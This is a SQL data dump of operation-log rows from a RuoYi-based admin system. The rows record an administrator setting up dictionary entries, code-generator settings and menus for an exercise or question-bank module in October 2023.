INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (129, '字典类型', 2, 'com.ruoyi.project.system.controller.SysDictTypeController.edit()', 'PUT', 1, 'admin', NULL, '/system/dict/type', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-25 08:55:40\",\"dictId\":101,\"dictName\":\"题目分类\",\"dictType\":\"sys_exercise_cate\",\"params\":{},\"remark\":\"题目分类字典值\",\"status\":\"0\",\"updateBy\":\"admin\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 08:55:53', 170);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (130, '字典数据', 1, 'com.ruoyi.project.system.controller.SysDictDataController.add()', 'POST', 1, 'admin', NULL, '/system/dict/data', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"default\":false,\"dictLabel\":\"基础题\",\"dictSort\":0,\"dictType\":\"sys_exercise_cate\",\"dictValue\":\"0\",\"listClass\":\"default\",\"params\":{},\"status\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 08:56:10', 69);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (131, '字典数据', 1, 'com.ruoyi.project.system.controller.SysDictDataController.add()', 'POST', 1, 'admin', NULL, '/system/dict/data', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"default\":false,\"dictLabel\":\"阅读程序题\",\"dictSort\":1,\"dictType\":\"sys_exercise_cate\",\"dictValue\":\"1\",\"listClass\":\"default\",\"params\":{},\"status\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 08:56:24', 88);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (132, '字典数据', 1, 'com.ruoyi.project.system.controller.SysDictDataController.add()', 'POST', 1, 'admin', NULL, '/system/dict/data', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"default\":false,\"dictLabel\":\"补全程序题\",\"dictSort\":2,\"dictType\":\"sys_exercise_cate\",\"dictValue\":\"2\",\"listClass\":\"default\",\"params\":{},\"status\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 08:56:36', 74);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (133, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exercises\",\"className\":\"Exercises\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":1,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 08:54:47\",\"usableColumn\":false},{\"capJavaField\":\"ExerciseTitle\",\"columnComment\":\"题目描述\",\"columnId\":2,\"columnName\":\"exercise_title\",\"columnType\":\"text\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"textarea\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"exerciseTitle\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 08:54:47\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceA\",\"columnComment\":\"选项A\",\"columnId\":3,\"columnName\":\"choice_a\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"choiceA\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 08:54:47\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceB\",\"columnComment\":\"选项B\",\"columnId\":4,\"columnName\":\"choice_b\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"is', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 08:58:02', 115);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (134, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exercises\",\"className\":\"Exercises\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":1,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 08:58:02\",\"usableColumn\":false},{\"capJavaField\":\"ExerciseTitle\",\"columnComment\":\"题目描述\",\"columnId\":2,\"columnName\":\"exercise_title\",\"columnType\":\"text\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"textarea\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"exerciseTitle\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 08:58:02\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceA\",\"columnComment\":\"选项A\",\"columnId\":3,\"columnName\":\"choice_a\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"javaField\":\"choiceA\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 08:58:02\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceB\",\"columnComment\":\"选项B\",\"columnId\":4,\"columnName\":\"choice_b\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"i', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 09:01:38', 104);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (135, '代码生成', 8, 'com.ruoyi.project.tool.gen.controller.GenController.batchGenCode()', 'GET', 1, 'admin', NULL, '/tool/gen/batchGenCode', '127.0.0.1', '内网IP', '{\"tables\":\"tb_exercises\"}', NULL, 0, NULL, '2023-10-25 09:03:08', 99);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (136, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exercises\",\"className\":\"Exercises\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":1,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:01:38\",\"usableColumn\":false},{\"capJavaField\":\"ExerciseTitle\",\"columnComment\":\"题目描述\",\"columnId\":2,\"columnName\":\"exercise_title\",\"columnType\":\"text\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"textarea\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"exerciseTitle\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:01:38\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceA\",\"columnComment\":\"选项A\",\"columnId\":3,\"columnName\":\"choice_a\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"javaField\":\"choiceA\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:01:38\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceB\",\"columnComment\":\"选项B\",\"columnId\":4,\"columnName\":\"choice_b\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"i', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 09:06:34', 68);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (137, '菜单管理', 1, 'com.ruoyi.project.system.controller.SysMenuController.add()', 'POST', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"createBy\":\"admin\",\"icon\":\"form\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuName\":\"试题管理\",\"menuType\":\"M\",\"orderNum\":5,\"params\":{},\"parentId\":0,\"path\":\"dataControl\",\"status\":\"0\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 09:10:00', 36);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (138, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/4', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"菜单已分配,不允许删除\",\"code\":601}', 0, NULL, '2023-10-25 09:10:30', 24);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (139, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"createTime\":\"2023-10-23 20:57:31\",\"icon\":\"guide\",\"isCache\":\"0\",\"isFrame\":\"0\",\"menuId\":4,\"menuName\":\"若依官网\",\"menuType\":\"M\",\"orderNum\":4,\"params\":{},\"parentId\":0,\"path\":\"http://ruoyi.vip\",\"perms\":\"\",\"query\":\"\",\"status\":\"1\",\"updateBy\":\"admin\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 09:10:55', 33);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (140, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/4', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"菜单已分配,不允许删除\",\"code\":601}', 0, NULL, '2023-10-25 09:11:02', 34);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (141, '菜单管理', 1, 'com.ruoyi.project.system.controller.SysMenuController.add()', 'POST', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"createBy\":\"admin\",\"icon\":\"edit\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuName\":\"题目管理\",\"menuType\":\"M\",\"orderNum\":1,\"params\":{},\"parentId\":2000,\"path\":\"exercise\",\"status\":\"0\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 09:11:59', 37);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (142, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"createTime\":\"2023-10-25 09:11:59\",\"icon\":\"edit\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuId\":2001,\"menuName\":\"题目管理\",\"menuType\":\"C\",\"orderNum\":1,\"params\":{},\"parentId\":2000,\"path\":\"exercise\",\"perms\":\"dataControl:exercise\",\"status\":\"0\",\"updateBy\":\"admin\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 09:13:20', 22);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (143, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"createTime\":\"2023-10-25 09:11:59\",\"icon\":\"edit\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuId\":2001,\"menuName\":\"题目管理\",\"menuType\":\"C\",\"orderNum\":1,\"params\":{},\"parentId\":2000,\"path\":\"exercise\",\"perms\":\"dataControl:exercise:list\",\"status\":\"0\",\"updateBy\":\"admin\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 09:14:08', 30);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (144, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exercises\",\"className\":\"Exercises\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":1,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:06:34\",\"usableColumn\":false},{\"capJavaField\":\"ExerciseTitle\",\"columnComment\":\"题目描述\",\"columnId\":2,\"columnName\":\"exercise_title\",\"columnType\":\"text\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"textarea\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"exerciseTitle\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:06:34\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceA\",\"columnComment\":\"选项A\",\"columnId\":3,\"columnName\":\"choice_a\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"javaField\":\"choiceA\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:06:34\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceB\",\"columnComment\":\"选项B\",\"columnId\":4,\"columnName\":\"choice_b\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"i', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 09:16:54', 69);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (145, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"component\":\"dataControl/exercise\",\"createTime\":\"2023-10-25 09:11:59\",\"icon\":\"edit\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuId\":2001,\"menuName\":\"题目管理\",\"menuType\":\"C\",\"orderNum\":1,\"params\":{},\"parentId\":2000,\"path\":\"exercise\",\"perms\":\"dataControl:exercise:list\",\"status\":\"0\",\"updateBy\":\"admin\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 09:19:22', 23);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (146, '菜单管理', 1, 'com.ruoyi.project.system.controller.SysMenuController.add()', 'POST', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"createBy\":\"admin\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuName\":\"题目新增\",\"menuType\":\"F\",\"orderNum\":1,\"params\":{},\"parentId\":2001,\"status\":\"0\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 09:20:11', 19);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (147, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exercise\",\"className\":\"Exercises\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":1,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:16:54\",\"usableColumn\":false},{\"capJavaField\":\"ExerciseTitle\",\"columnComment\":\"题目描述\",\"columnId\":2,\"columnName\":\"exercise_title\",\"columnType\":\"text\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"textarea\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"exerciseTitle\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:16:54\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceA\",\"columnComment\":\"选项A\",\"columnId\":3,\"columnName\":\"choice_a\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"javaField\":\"choiceA\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:16:54\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceB\",\"columnComment\":\"选项B\",\"columnId\":4,\"columnName\":\"choice_b\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"is', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 09:24:15', 132);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (148, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exercise\",\"className\":\"ExerciseVO\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":1,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:24:15\",\"usableColumn\":false},{\"capJavaField\":\"ExerciseTitle\",\"columnComment\":\"题目描述\",\"columnId\":2,\"columnName\":\"exercise_title\",\"columnType\":\"text\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"textarea\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"exerciseTitle\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:24:15\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceA\",\"columnComment\":\"选项A\",\"columnId\":3,\"columnName\":\"choice_a\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"javaField\":\"choiceA\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:24:15\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceB\",\"columnComment\":\"选项B\",\"columnId\":4,\"columnName\":\"choice_b\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 